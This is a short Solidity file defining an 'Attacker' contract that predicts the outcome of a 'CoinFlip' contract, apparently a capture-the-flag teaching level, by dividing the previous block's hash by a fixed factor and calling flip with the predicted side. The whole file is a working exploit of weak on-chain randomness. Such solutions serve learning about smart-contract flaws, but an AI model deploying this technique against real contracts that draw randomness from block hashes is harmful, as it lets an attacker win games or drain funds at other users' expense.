// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./CoinFlip.sol";

contract Attacker {
    CoinFlip public coinFlip;
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _coinFlip) {
        coinFlip = CoinFlip(_coinFlip);
    }

    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 flipResult = blockValue / FACTOR;
        bool side = flipResult == 1 ? true : false;

        coinFlip.flip(side);

        emit AttackExecuted(coinFlip.consecutiveWins());
    }

    event AttackExecuted(uint256 consecutiveWins);
}
